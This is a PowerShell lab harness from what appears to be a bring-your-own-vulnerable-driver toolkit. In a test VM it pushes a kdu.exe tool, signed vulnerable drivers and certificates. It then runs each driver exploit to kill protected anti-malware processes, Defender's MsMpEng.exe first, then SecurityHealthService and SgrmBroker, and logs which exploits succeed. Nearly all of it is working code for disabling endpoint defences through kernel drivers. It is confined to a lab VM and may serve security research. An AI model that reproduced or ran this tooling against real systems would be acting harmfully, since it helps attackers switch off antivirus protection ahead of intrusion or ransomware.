# blook-kdu: verify kill-only exploits against a PPL-protected process in the lab VM.
#
# The memory self-test deliberately SKIPs kill-only drivers, so this lane proves
# they are usable: each id must terminate the protected process (default
# MsMpEng.exe, a PPL anti-malware service) through its driver. Windows restarts
# the service, so the loop re-resolves the pid every iteration.
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string[]] $Ids,
    [string] $Vm = 'vm-byovd',
    [string] $Out = '',
    [string] $Target = 'MsMpEng.exe',
    [int] $TimeoutSeconds = 90,
    [string] $Root = (Split-Path -Parent (Split-Path -Parent $PSScriptRoot)),
    [string] $Bvmenv = 'D:\blook-kernel-project\blook-vmware-environment\build\windows\x64\release\bvmenv.exe'
)
$ErrorActionPreference = 'Stop'
$Ids = @($Ids | ForEach-Object { $_ -split '[,\s]+' } | Where-Object { $_ })
if (-not $Out) { $Out = Join-Path $Root ("docs/lab/kill-only-{0}" -f (Get-Date -Format 'HHmmss')) }
New-Item -ItemType Directory -Force $Out | Out-Null
New-Item -ItemType Directory -Force (Join-Path $Out 'raw') | Out-Null
$logPath = Join-Path $Out 'kill.log'
function Log([string] $m) {
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $line
    Add-Content -LiteralPath $logPath -Value $line -Encoding utf8
}
function Get-TargetPid {
    # Several safe PPL targets: Defender restarts slowly, so fall back to other
    # protected broker services before giving up. SecurityHealthService and
    # SgrmBroker restart quickly and are not critical processes.
    $targets = @('MsMpEng.exe', 'SecurityHealthService.exe', 'SgrmBroker.exe')
    for ($attempt = 0; $attempt -lt 12; $attempt++) {
        foreach ($name in $targets) {
            $text = (& $Bvmenv exec $Vm --elevated --timeout 60 -- "cmd /c tasklist /FI `"IMAGENAME eq $name`" /FO CSV /NH" 2>&1 | Out-String)
            foreach ($line in ($text -split "`r?`n")) {
                if ($line -match '^"([^"]+)","(\d+)"') { return @{ name = $Matches[1]; pid = [int]$Matches[2] } }
            }
        }
        if ($attempt -eq 3) {
            & $Bvmenv exec $Vm --elevated --timeout 90 -- 'cmd /c sc start windefend' 2>&1 | Out-Null
        }
        Start-Sleep -Seconds 5
    }
    return @{ name = ''; pid = 0 }
}
function Repair-Guest {
    Log 'guest crashed/hung: resetting and re-preparing'
    & $Bvmenv reset $Vm | Out-Null
    & $Bvmenv start $Vm | Out-Null
    & $Bvmenv wait-ready $Vm --timeout 420 | Out-Null
    & $Bvmenv push $Vm (Join-Path $Root 'build/windows/x64/release/kdu.exe') 'C:\byovd\kdu.exe' | Out-Null
    & $Bvmenv push $Vm (Join-Path $Root 'build/generated/signed-drivers') 'C:\byovd\drivers' | Out-Null
    & $Bvmenv push $Vm (Join-Path $Root 'build/generated/certs') 'C:\byovd\certs' | Out-Null
    & $Bvmenv push $Vm (Join-Path $Root 'tools/vm-lab/guest-prepare.ps1') 'C:\byovd\guest-prepare.ps1' | Out-Null
    & $Bvmenv exec $Vm --elevated --timeout 180 -- 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\byovd\guest-prepare.ps1 -ByovdDir C:\byovd -TestSigning' | Out-Null
    & $Bvmenv push $Vm (Join-Path $Root 'build/windows/x64/release/kdu.exe') 'C:\byovd\kdu.exe' | Out-Null
}
$mutex = New-Object System.Threading.Mutex($false, 'Global\blook-kdu-vmlab')
try { $owned = $mutex.WaitOne([TimeSpan]::FromSeconds(3600)) } catch [System.Threading.AbandonedMutexException] { $owned = $true }
if (-not $owned) { throw 'vm-lab mutex timeout' }
$rows = @()
foreach ($id in $Ids) {
    $trg = Get-TargetPid
    $pidTarget = $trg.pid
    $Target = $trg.name
    if ($pidTarget -eq 0) {
        Log "$id SKIP no PPL target present"
        $rows += [pscustomobject]@{ id = $id; status = 'SKIP'; detail = "target $Target absent" }
        continue
    }
    $text = (& $Bvmenv exec $Vm --elevated --timeout $TimeoutSeconds -- "cmd /c set BLOOK_KDU_DRIVER_DIR=C:\byovd\drivers && C:\byovd\kdu.exe process kill --pid $pidTarget --exploit $id" 2>&1 | Out-String)
    Set-Content -LiteralPath (Join-Path $Out "raw/$id.log") -Value $text -Encoding utf8
    if ($text -match 'guest script failed \(timeout\)|VMware Tools are not running|not powered on') { Log "$id CRASH"; $rows += [pscustomobject]@{ id = $id; status = 'CRASH'; detail = 'guest crashed' }; Repair-Guest; continue }
    $status = 'FAIL'
    if ($text -match '(?i)terminated|killed|success') { $status = 'PASS' }
    $detail = [string]((($text -split "`n") | Where-Object { $_ -match 'terminated|killed|success|error|FAIL' } | Select-Object -First 1)); $detail = $detail.Trim()
    Log "$status $id pid=$pidTarget $detail"
    $rows += [pscustomobject]@{ id = $id; status = $status; detail = $detail; pid = $pidTarget; raw = "raw/$id.log" }
}
$rows | ConvertTo-Json -Depth 4 | Set-Content (Join-Path $Out 'kill-matrix.json') -Encoding utf8
$pass = @($rows | Where-Object { $_.status -eq 'PASS' }).Count
Log ("kill-only done: {0} ids, {1} PASS" -f $rows.Count, $pass)

if ($owned) { [void]$mutex.ReleaseMutex() }
$mutex.Dispose()